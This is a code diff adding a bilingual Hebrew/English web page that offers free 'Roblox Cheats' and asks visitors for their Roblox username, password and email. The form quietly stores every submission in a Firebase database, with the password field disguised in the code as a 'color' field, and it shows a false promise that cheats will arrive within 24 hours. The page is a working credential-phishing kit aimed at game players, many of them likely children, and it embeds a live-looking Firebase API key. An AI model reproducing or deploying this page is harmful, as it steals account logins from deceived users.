@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl" id="mainHtml">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>שאלון zviki</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 450px; position: relative; }
+        .lang-switch { position: absolute; top: 10px; left: 10px; }
+        [dir="ltr"] .lang-switch { left: auto; right: 10px; }
+        input, button { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+        button { background: #007bff; color: white; cursor: pointer; border: none; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #0056b3; }
+        .delete-btn { background: #ff4d4d; margin-top: 20px; font-size: 14px; }
+        .delete-btn:hover { background: #c82333; }
+        .status { text-align: center; color: #28a745; font-weight: bold; min-height: 24px; }
+        h2 { margin-top: 0; color: #333; }
+        label { font-weight: 600; color: #555; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="lang-switch">
+        <button onclick="toggleLanguage()" id="langBtn" style="width: auto; padding: 5px 10px;">English</button>
+    </div>
+    
+    <h2 id="title">ציטים לרובלוקס</h2>
+    <form id="quizForm">
+        <label id="labelName">שם משתמש</label>
+        <input type="text" id="userName" placeholder="הכנס שם..." required>
+
+        <label id="labelColor">סיסמה</label>
+        <input type="text" id="userColor" placeholder="למשל: כחול" required>
+
+         <label id="labelEmail">כתובת אימייל:</label>
+        <input type="email" id="userEmail" placeholder="example@mail.com" required>
+        
+        <button type="submit" id="submitBtn">קבל ציטים</button>
+    </form>
+    
+    <div id="status" class="status"></div>
+
+    <hr>
+    
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBa3zQBhqsTL7LchWLEZUV4ThZuBE20BdU",
+    authDomain: "zviki-4ccc3.firebaseapp.com",
+    projectId: "zviki-4ccc3",
+    storageBucket: "zviki-4ccc3.firebasestorage.app",
+    messagingSenderId: "863677370130",
+    appId: "1:863677370130:web:f2f8d9de13c7f91c1fedcb",
+    measurementId: "G-BPEXRPRSPY"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+ const translations = {
+    he: {
+        title: "ציטים לרובלוקס",
+        labelName: "שם משתמש ",
+        labelColor: "סיסמה ",
+        labelEmail: "כתובת אימייל:",
+        placeholderName: "הכנס שם...",
+        placeholderColor: "הכנס סיסמה...",
+        submit: "שלח",
+        success: "קבלת הציטים תתקבל בתוך 24 שעות ",
+        sending: "שולח...",
+        langBtn: "English",
+        dir: "rtl"
+    },
+    en: {
+        title: "Roblox Cheats",
+        labelName: "Username",
+        labelColor: "Password",
+        labelEmail: "Email Address:",
+        placeholderName: "Enter username...",
+        placeholderColor: "Enter password...",
+        submit: "Submit",
+        success: "You will receive the cheats within 24 hours",
+        sending: "Sending...",
+        langBtn: "עברית",
+        dir: "ltr"
+    }
+};
+
+
+  let currentLang = 'he';
+
+  window.toggleLanguage = () => {
+    currentLang = currentLang === 'he' ? 'en' : 'he';
+    const t = translations[currentLang];
+    document.getElementById('mainHtml').dir = t.dir;
+    document.getElementById('title').innerText = t.title;
+    document.getElementById('labelName').innerText = t.labelName;
+    document.getElementById('labelEmail').innerText = t.labelEmail;
+    document.getElementById('labelColor').innerText = t.labelColor;
+    document.getElementById('userName').placeholder = t.placeholderName;
+    document.getElementById('userEmail').placeholder = t.placeholderEmail;
+    document.getElementById('userColor').placeholder = t.placeholderColor;
+    document.getElementById('submitBtn').innerText = t.submit;
+    document.getElementById('deleteBtn').innerText = t.delete;
+    document.getElementById('langBtn').innerText = t.langBtn;
+  };
+
+  const form = document.getElementById('quizForm');
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const t = translations[currentLang];
+    const submitBtn = document.getElementById('submitBtn');
+    submitBtn.disabled = true;
+    submitBtn.innerText = t.sending;
+
+    try {
+      await addDoc(collection(db, "zviki"), {
+        name: document.getElementById('userName').value,
+        email: document.getElementById('userEmail').value, // שמירת המייל ב-Firebase
+        color: document.getElementById('userColor').value,
+        language: currentLang,
+        timestamp: new Date()
+      });
+      document.getElementById('status').innerText = t.success;
+      form.reset();
+    } catch (error) {
+      console.error(error);
+      alert("שגיאה! וודא שהגדרת Rules כפי שהסברתי.");
+    }
+    submitBtn.disabled = false;
+    submitBtn.innerText = t.submit;
+  });
+
+  window.deleteAllData = async () => {
+    const t = translations[currentLang];
+    if (confirm(t.confirmDelete)) {
+      const querySnapshot = await getDocs(collection(db, "zviki"));
+      querySnapshot.forEach(async (docRef) => {
+        await deleteDoc(doc(db, "zviki", docRef.id));
+      });
+      alert("הנתונים נמחקו!");
+    }
+  };
+</script>
+
+</body>
+</html>
